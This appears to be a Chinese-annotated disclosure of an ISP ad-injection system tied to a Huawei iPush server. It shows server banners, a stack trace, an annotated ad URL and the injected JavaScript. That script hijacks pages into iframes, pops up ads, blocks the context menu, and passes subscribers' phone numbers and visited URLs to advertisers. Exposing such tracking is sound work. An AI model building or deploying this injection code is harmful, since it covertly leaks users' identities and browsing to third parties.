
```
Server: Apache/2.2.21 (Unix) DAV/2 mod_jk/1.2.32
```

```
java.lang.NumberFormatException: For input string: "20147x7"
     java.lang.NumberFormatException.forInputString(NumberFormatException.java:48)
     java.lang.Integer.parseInt(Integer.java:456)
     java.lang.Integer.valueOf(Integer.java:553)
     com.huawei.ipush.adserver.web.PushDoneServlet.doGet(PushDoneServlet.java:57)
     javax.servlet.http.HttpServlet.service(HttpServlet.java:617)
     javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
Apache Tomcat/6.0.18
```

```
http://220.191.158.69:10010/a/s?
 f=adstyle_msn.html // 广告类型（风格），MSN弹出式
&adid=201477 // 广告ID
&tcca=XXXXXXXXXXXXX // base64: ??????????? 账号即登陆者的电话号码（为了保密这里不给出）
&urip=XXXXXXXX // 10进制的IP地址
&orlu=aHR0cDovL3QuY24vYTBEV2dK // base64: http://t.cn/a0DWgJ 用户访问的URL
&spid=1096691091
&area=82
&ts=1345346067
&aorlu=aHR0cDovL3BhZ2UuNzZtaS5jb20vZzUwL3pqL3pqX3B0NDNfNzIwLmh0bQ==
// base64: http://page.76mi.com/g50/zj/zj_pt43_720.htm 广告商URL
&p1arm=300 // 弹出广告的高度
&p2arm=400 // 弹出广告的宽度
&p3arm=0
&p4arm=5
&p5arm=3
&p6arm=1
&appd=0 // 广告应用类型，如是为：
        // 1 传送访问的网址给广告商
        // 2 传送你的账号（电话号码）给广告商
        // 3 传送你的账号（电话号码）及网址给广告商
&hasCount=1 // 为1时也会向广告商发送你的账号（电话号码）和网址给广告商
&hasWhiteUser=0
```


```
// adurl 广告商地址
// g 用户访问的URL
// realAct 用户的账号（即电话号码）
if (appd == 1) {
    adurl = appendParam(adurl, "param=" + encodeStr("url=" + g));
} else if (appd == 2) {
    adurl = appendParam(adurl, "param=" + encodeStr("account=" + realAct));
} else if (appd == 3) {
    adurl = appendParam(adurl, "param=" + encodeStr("account=" + realAct + "&url=" + g));
}
```

### 附JS ###
```
var location;
top.window.moveTo(0, 0);
top.window.resizeTo(screen.availWidth, screen.availHeight);

function init(param) {
    var html = "<iframe frameBorder=0 width=100% height=100% scrolling=auto src='";
    if (top === window.self && document.body.clientWidth >= 500 && document.body.clientHeight >= 500) {
        html += param;
    } else {
        html += decodeBase64(getPara("orlu", param));
        html = addOrUpdateParam(html, "t", (new Date()).getTime());
    }
    document.getElementById("b").innerHTML = html + "'></iframe>";
}

function getPara(paraName, paraStr) {
    var oRegex = new RegExp('[\?&]' + paraName + '=([^&]+)', 'i');
    var oMatch = oRegex.exec(paraStr);
    if (oMatch && oMatch.length > 1) {
        return oMatch[1];
    } else {
        return '';
    }
}

function decodeBase64(base64Str) {
    var b = new Base64();
    return b.decode(base64Str);
}

function addOrUpdateParam(html, skey, sval) {
    var oVal = getPara(skey, html);
    if (oVal != '') {
        if (html.indexOf(skey + '=' + oVal) > 0) {
            html = html.replace(skey + '=' + oVal, skey + "=" + sval);
        } else if (html.indexOf('&' + skey + '=') > 0) {
            html = html.replace('&' + skey + "=" + oVal, '&' + skey + "=" + sval);
        }
    } else {
        if (html.indexOf('?') > 0) {
            html = html + "&" + skey + "=" + sval;
        } else {
            html = html + "?" + skey + "=" + sval;
        }
    }
    return html;
}

function Base64() {
    _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    this.decode = function (input) {
        var output = "";
        var chr1, chr2, chr3;
        var enc1, enc2, enc3, enc4;
        var i = 0;
        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
        while (i < input.length) {
            enc1 = _keyStr.indexOf(input.charAt(i++));
            enc2 = _keyStr.indexOf(input.charAt(i++));
            enc3 = _keyStr.indexOf(input.charAt(i++));
            enc4 = _keyStr.indexOf(input.charAt(i++));
            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;
            output = output + String.fromCharCode(chr1);
            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }
        }
        output = _utf8_decode(output);
        return output;
    }
    _utf8_decode = function (utftext) {
        var string = "";
        var i = 0;
        var c = c1 = c2 = 0;
        while (i < utftext.length) {
            c = utftext.charCodeAt(i);
            if (c < 128) {
                string += String.fromCharCode(c);
                i++;
            } else if ((c > 191) && (c < 224)) {
                c2 = utftext.charCodeAt(i + 1);
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                i += 2;
            } else {
                c2 = utftext.charCodeAt(i + 1);
                c3 = utftext.charCodeAt(i + 2);
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                i += 3;
            }
        }
        return string;
    }
}
```
```
var absp = getAds();
var paraStr = document.location.search;
var location;
var adid = getParameter("adid", paraStr);
var area = getParameter("area", paraStr);
var account = getParameter("tcca", paraStr);
var realAct = decodeStr(account);
var urip = getParameter("urip", paraStr);
var g = getParameter("orlu", paraStr);
var adurl = getParameter("aorlu", paraStr);
var hasFrame = getParameter("p6arm", paraStr);
var spid = getParameter("spid", paraStr);
var time = getParameter("p3arm", paraStr);
var time = time * 1000;
var appd = getParameter("appd", paraStr);
var hasCount = getParameter("hasCount", paraStr);
var hasWhiteUser = getParameter("hasWhiteUser", paraStr);
var ts = getParameter("ts", paraStr);
var beginTime = new Date().getTime();
var sendStayTimeCnt = 1;
var barHeight = 0;

var pusd = getParameter("p5arm", paraStr);
var he = getParameter("p1arm", paraStr);
var wi = getParameter("p2arm", paraStr);

g = decodeStr(g);
adurl = decodeStr(adurl);
if (navigator.userAgent.indexOf('Opera') > -1) {
    g = appendParam(g, "t=" + new Date().getTime());
}
if (w == undefined) {
    var w = '<html><head><meta http-equiv="Refresh" content="0;URL=' + g + '"/></head></html>';
} else {
    var w = '';
}

if (appd == 1) {
    adurl = appendParam(adurl, "param=" + encodeStr("url=" + g));
} else if (appd == 2) {
    adurl = appendParam(adurl, "param=" + encodeStr("account=" + realAct));
} else if (appd == 3) {
    adurl = appendParam(adurl, "param=" + encodeStr("account=" + realAct + "&url=" + g));
}

function stop() {
    return false;
}

document.oncontextmenu = stop;

var objTimer = 0;

function $(n) {
    return document.getElementById(n);
}

function $i(i) {
    try {
        return parseInt(i);
    } catch (ex) {
        return 0;
    }
}

function MessageTip(id, pusd) {
    var body = $("b");

    body.innerHTML = "<iframe id='pushDone' src='' style='display:none'></iframe>" + "<iframe name=cn src='javascript:parent.w' frameBorder=0 width=100% height=100%></iframe>" + "<div class='ad' id='" + id + "'></div>";

    var url_unpush = absp + "/a/unpush?adid=" + adid + "&tcca=" + account + "&urip=" + urip + "&area=" + area;
    var url_click = absp + "/a/adclick?spid=" + spid + "&adid=" + adid + "&tcca=" + account + "&urip=" + urip;
    if (hasWhiteUser == 1) {
        adurl = appendParam(adurl, "u=" + encodeURIComponent(url_unpush));
    }
    if (hasCount == 1) {
        adurl = appendParam(adurl, "c=" + encodeURIComponent(url_click));
    }

    var temp = "<table id='content' width=" + wi + " border=0 cellSpacing=0 cellPadding=0 align='center' >";
    if (hasFrame == 1) {
        barHeight = 16;
        temp = temp + "<tr><td id='title' height=" + barHeight + ">" + "<img id='close' onclick='mt1.close=true;mt1.hide();' alt='Close' src='./close.gif'/>" + "</td></tr>";
    }
    temp = temp + "<tr><td width=" + wi + " height=" + he + ">";
    temp = temp + "<iframe name='ad' src='" + adurl + "' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
    temp = temp + "</td></tr>";
    temp = temp + "</table>";

    this.id = id;
    this.obj = $(id);

    (this.obj.style.visibility = "hidden");
    (this.obj.style.position = "absolute");
    (this.obj.style.left = "0px");
    (this.obj.style.top = "0px");
    (this.obj.style.zIndex = "99999");
    (this.obj.style.width = wi);
    (this.obj.style.height = parseInt(he) + barHeight);

    this.divTop = $i(this.obj.style.top);
    this.divLeft = $i(this.obj.style.left);
    this.divHeight = this.obj.offsetHeight;
    this.divWidth = this.obj.offsetWidth;
    this.docWidth = document.body.clientWidth;
    this.docHeight = document.body.clientHeight;
    this.stepx = 0;

    this.timeout = 30 * time;
    this.speed = 20;

    this.step = pusd;
    this.timer = 0;
    this.pause = false;
    this.close = false;
    this.autoClose = true;

    this.add(this);

    this.obj.innerHTML = temp;
    sendStayTime();
}

MessageTip.prototype.tips = new Array();

MessageTip.prototype.add = function (mt) {
    this.tips.push(mt);
};

MessageTip.prototype.moveToPosition = function () {
    var me = this;
    var mess = this.obj;
    me.docWidth = document.body.clientWidth;
    me.docHeight = document.body.clientHeight;
    mess.style.left = $i(document.body.scrollLeft) + document.body.clientWidth - $i(mess.style.width);
    mess.style.top = $i(document.body.scrollTop) + document.body.clientHeight + 10 + me.stepx;
};

MessageTip.prototype.show = function () {
    if (this.onload()) {
        var me = this;
        var mess = this.obj;
        mess.onmouseover = function () {
            me.pause = true;
        };
        mess.onmouseout = function () {
            me.pause = false;
        };
        mess.style.top = $i(document.body.scrollTop) + this.docHeight + 10;
        mess.style.left = $i(document.body.scrollLeft) + this.docWidth - this.divWidth;
        mess.style.visibility = 'visible';
        var moveUp = function () {
                var tHeight = me.divHeight;
                if (parseInt(mess.style.top, 10) <= (this.docHeight - this.divHeight + parseInt(document.body.scrollTop, 10))) {
                    window.clearInterval(me.timer);
                }
                if ($i(mess.style.top) <= (me.docHeight - tHeight + $i(document.body.scrollTop))) {
                    me.timeout--;
                    if (me.timeout == 0) {
                        window.clearInterval(me.timer);
                        if (me.autoClose) {
                            me.hide();
                        }
                    }
                } else {
                    me.stepx -= me.step;
                    me.moveToPosition();
                }
            };
        this.timer = window.setInterval(moveUp, this.speed);
    }
};

MessageTip.prototype.hide = function () {
    if (this.onload()) {
        var me = this;
        var mess = this.obj;

        if (this.timer > 0) {
            window.clearInterval(me.timer);
        }
        var moveDown = function () {
                if (me.pause == false || me.close) {
                    if ($i(mess.style.top) >= ($i(document.body.scrollTop) + me.docHeight + 10)) {
                        window.clearInterval(me.timer);
                        document.getElementById("MsnDialog").style.display = "none";
                        document.getElementById("MsnDialog").style.height = 0;
                        mess.style.height = 0;
                        mess.style.visibility = 'hidden';
                    } else {
                        me.stepx = parseInt(me.stepx) + parseInt(me.step) * 2;
                        me.moveToPosition();
                    }
                }
            };
        this.timer = window.setInterval(moveDown, this.speed);
    }
    sendStayTime();
};

function ReLocat(MsId) {
    try {
        divHeight = parseInt($(MsId).offsetHeight, 10);
        divWidth = parseInt($(MsId).offsetWidth, 10);
        docWidth = document.body.clientWidth;
        docHeight = document.body.clientHeight;
        $(MsId).style.top = docHeight - divHeight + parseInt(document.body.scrollTop, 10);
        $(MsId).style.left = docWidth - divWidth + parseInt(document.body.scrollLeft, 10);
    } catch (e) {}
}

MessageTip.prototype.onload = function () {
    return true;
};

MessageTip.prototype.onunload = function () {
    return true;
};

MessageTip.prototype.resizeDiv = function () {
    i += 1;
    if (i > 500) {
        closeDiv();
    }
    try {
        divHeight = parseInt($(this.id).offsetHeight, 10);
        divWidth = parseInt($(this.id).offsetWidth, 10);
        docWidth = document.body.clientWidth;
        docHeight = document.body.clientHeight;
        $(this.id).style.top = docHeight - divHeight + parseInt(document.body.scrollTop, 10);
        $(this.id).style.left = docWidth - divWidth + parseInt(document.body.scrollLeft, 10);
    } catch (e) {}
};

window.onresize = function () {
    mt1.moveToPosition();
};

var mt1 = null;

function loadAttribute() {
    var body = document.getElementById("b");
    var htmlStr = "";
    if (document.referrer == null || document.referrer == '') {
        return;
    }
    if (isDisplayed(ts) == 1) {
        htmlStr = "<iframe name=cn src='javascript:parent.w' frameBorder=0 width=100% height=100% scrolling=auto></iframe>";
        body.innerHTML = htmlStr;
        return;
    }

    var MsId = "MsnDialog";
    mt1 = new MessageTip(MsId, pusd);

    mt1.show();

    if (time > 0) {
        setTimeout("mt1.hide()", time);
    }
    setDisplayed(ts);
    setTimeout("sendStayTime();", 61000);
}

function closeAd() {
    mt1.close = true;
    mt1.hide();
}
```